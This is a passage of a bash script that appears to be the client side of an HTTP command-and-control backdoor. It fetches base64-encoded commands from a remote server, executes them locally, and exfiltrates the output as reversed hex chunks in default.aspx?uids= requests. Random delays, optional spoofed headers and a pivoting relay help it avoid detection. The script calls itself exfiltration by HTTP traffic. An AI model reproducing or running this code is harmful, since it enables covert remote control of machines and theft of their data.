		if [ "$DetectingServerPayInjtoHeader" == ",0" ] ;
		then
		#echo ops
		XServerHI=""
		fi

	#400 Bad Request detection
	BadRequestDetection400=`strings dumpcmds.log | grep "<title>400 Bad Request</title>"`
	BadRequestDetectiontext=`strings dumpcmds.log | grep "<p>Your browser sent a request that this server could not understand.<br />"`
	BadRequestDetectiontext2=`strings dumpcmds.log | grep "<h1>Bad Request</h1>"`
	if [[ "$BadRequestDetection400" != "" || "$BadRequestDetectiontext" != "" || "$BadRequestDetectiontext2" != "" ]] ;
	then
		Timestr=`date '+%d-%m-%Y.%H-%M-%S'`
		echo "[!]:CMD::Server.Bad.Request:Detected [$Timestr]"
		sleep 0.5			
		Curl "$LocalhostIPv4" "http://$2:$3/default.aspx?badrequest=null" "sendhttp.log" "$Xheaderison" "$XServerHI" "$CurlDetected"
	fi



	#debug
	#echo "\"$myHostid\"":"\"$HostIDisValid\""

	if [ "$myHostid" == "$HostIDisValid" ] ;	
	then

			if [ "$Xheaderison" == "true" ];
			then
			Timestr=`date '+%d-%m-%Y.%H-%M-%S'`
			echo "[!]:CMD::Server.Command.Curl.FakeHeader.[on]:Detected [$Timestr]"
			fi

		if [ "$DetectSpecialCMDs" == "poweroff" ] ;
		then
		# send logoff signal to server before shutdown ;D	
		LocalhostIPv4=`hostname -I`
		output="poweroff"
		output=`echo "[$LocalhostIPv4] => "$output`
			if [ "$Base64Status" == "1" ];
			then
			output=`echo $output | base64  | xxd -p | rev `				
			Curl "$LocalhostIPv4" "http://$2:$3/default.aspx?uids=$output" "sendhttp.log" "$Xheaderison" "$XServerHI" "$CurlDetected"
			else
			output=`echo $output | xxd -p | rev`				
			Curl "$LocalhostIPv4" "http://$2:$3/default.aspx?uids=$output" "sendhttp.log" "$Xheaderison" "$XServerHI" "$CurlDetected"				
			fi
			sleep 0.5				  
			Curl "$LocalhostIPv4" "http://$2:$3/default.aspx?logoff=null" "sendhttp.log" "$Xheaderison" "$XServerHI" "$CurlDetected"
							
		sleep 1
		echo "$(tput setaf 2)[!]:CMD:""$(tput setaf 11)[poweroff]""$(tput setaf 2):Detected"
		fi

		if [ "$DetectSpecialCMDs" == "exit" ] ;
		then
		# send logoff signal to server before exit ;D
		LocalhostIPv4=`hostname -I`
		output="exit"
		output=`echo "[$LocalhostIPv4] => "$output`
			if [ "$Base64Status" == "1" ];
			then
			output=`echo $output | base64  | xxd -p | rev `				
			Curl "$LocalhostIPv4" "http://$2:$3/default.aspx?uids=$output" "sendhttp.log" "$Xheaderison" "$XServerHI" "$CurlDetected"				
			else
			output=`echo $output | xxd -p | rev`							
			Curl "$LocalhostIPv4" "http://$2:$3/default.aspx?uids=$output" "sendhttp.log" "$Xheaderison" "$XServerHI" "$CurlDetected"				
			fi
			sleep 0.5			
			Curl "$LocalhostIPv4" "http://$2:$3/default.aspx?logoff=null" "sendhttp.log" "$Xheaderison" "$XServerHI" "$CurlDetected"
								
		sleep 1
		echo "$(tput setaf 2)[!]:CMD:""$(tput setaf 11)[exit]""$(tput setaf 2):Detected"
		exit;
		fi

		# Pivoting Detection v1.4
		if (( `echo ${#DetectSpecialPivotingCMDs}` !=0 ))
		then
			if [[ $"$DetectSpecialPivotingCMDsTimer1" != $"$DetectSpecialPivotingCMDsTimer2" ]];
			then
			LocalhostIPv4=`hostname -I | tr -dc 0-9.`
			echo "" > "ClientMSG.txt"
			sleep 1
			DetectSpecialPivotingCMDsRAW=$DetectSpecialPivotingCMDs
			Intermediate "$2" "$LocalhostIPv4" "$DetectSpecialPivotingCMDsRAW" "$intermediate_init"
			DetectSpecialPivotingCMDsTimer2=$DetectSpecialPivotingCMDsTimer1
			Command1=$Command2;
			CMDTime1=$CMDTime2;
				if [ "$intermediate_init" == "false" ] 
				then
				intermediate_init="true"
				fi

			fi
			Command1=$Command2;
			CMDTime1=$CMDTime2;			
		fi		
		# Pivoting Detection v1.4


		# debug
		# echo  "\"$Command1\" \"$Command2\" \"$CMDTime1\" \"$CMDTime2\""


		if [[ $"$Command1" != $"$Command2" || $"$CMDTime1" != $"$CMDTime2" ]];
		then			

		Timestr=`date '+%d-%m-%Y.%H-%M-%S'`

		mycmd=`strings "dumpcmds.log" | grep "myTimeLabel_CMD" | cut -d'>' -f2 | cut -d'<' -f1 | base64 -d`
		sleep 1.$mydelayI
		Timestr=`date '+%d-%m-%Y.%H-%M-%S'`
		echo "[!]:CMD::Server.Command.[$mycmd]:Detected [$Timestr]"	
		#echo "$(tput setaf 10)" 
		echo "$(tput setaf 2)[!]:CMD:""$(tput setaf 11)[$mycmd]""$(tput setaf 2):Sending.Cmd.Output::SendbyHttp::Delay:[$4:1.$mydelayI:0.$mydelayII]:""$(tput setaf 3)Started""$(tput setaf 2) [$Timestr]"	
		
			
		output=`$mycmd`
		finalpayloads="";
		LocalhostIPv4=`hostname -I`
		output=`echo "[$LocalhostIPv4] => "$output`
		if [ "$Base64Status" == "1" ];
		then
		output=`echo $output | base64`
		fi
		for bytes in `echo $output | xxd -p -c 12 | rev`;
		do

		sleep $4			

		tput setaf 10
		reverse=`echo $bytes`
		mydelay2=`head /dev/urandom | tr -dc 3-9 | head -c1`
		mydelay3=`head /dev/urandom | tr -dc 0-3 | head -c1`

		sleep $mydelay3.$mydelay2

		if [ "$Base64Status" != "1" ];
		then
			if [[ "$XServerHI" == "iReferer-on" || "$XServerHI" == "iCookie-on" ]] ;
			then			
			echo "[>]:CMD:Byte:["$reverse"]::SendbyHttp::Delay:[$mydelay3.$mydelay2]::Web.Request:[default.aspx]"
			else
			echo "[>]:CMD:Byte:["$reverse"]::SendbyHttp::Delay:[$mydelay3.$mydelay2]::Web.Request:[default.aspx?uids=$bytes]"										
			fi

			Curl "$LocalhostIPv4" "http://$2:$3/default.aspx?uids=$bytes" "sendhttp.log" "$Xheaderison" "$XServerHI" "$CurlDetected"			
		fi

		if [ "$Base64Status" == "1" ];
		then
			if [[ "$XServerHI" == "iReferer-on" || "$XServerHI" == "iCookie-on" ]] ;
			then			
			echo "[>]:CMD:Byte:["$reverse"]::SendbyHttp::Delay:[$mydelay3.$mydelay2]::Web.Request.base64:[default.aspx]"					
			else
			echo "[>]:CMD:Byte:["$reverse"]::SendbyHttp::Delay:[$mydelay3.$mydelay2]::Web.Request.base64:[default.aspx?uids=$bytes]"						
			fi
			Curl "$LocalhostIPv4" "http://$2:$3/default.aspx?uids=$bytes" "sendhttp.log" "$Xheaderison" "$XServerHI" "$CurlDetected"			
		fi

		done

		tput setaf 2
		sleep 0.$mydelayII
		Timestr=`date '+%d-%m-%Y.%H-%M-%S'`
		echo "$(tput setaf 2)[!]:CMD:""$(tput setaf 2)[$mycmd]""$(tput setaf 2):Sending.Cmd.Output::SendbyHttp::Delay:[$4:1.$mydelayI:0.$mydelayII]:""$(tput setaf 3)Done""$(tput setaf 2) [$Timestr]"				
		sleep 0.2		
		Curl "$LocalhostIPv4" "http://$2:$3/default.aspx?logoff=null" "sendhttp.log" "$Xheaderison" "$XServerHI" "$CurlDetected"
				
		Timestr=`date '+%d-%m-%Y.%H-%M-%S'`
		echo "[!]:CMD::Exfiltration::SendbyHttp::Delay:[$4:1.$mydelayI:0.$mydelayII]:Done [$Timestr]"
		Command2=`echo $Command1`
		CMDTime2=`echo $CMDTime1`
		fi

	fi

	done
fi
fi

# ============================================Exfiltration by HTTP traffic (Executing Commands)===========

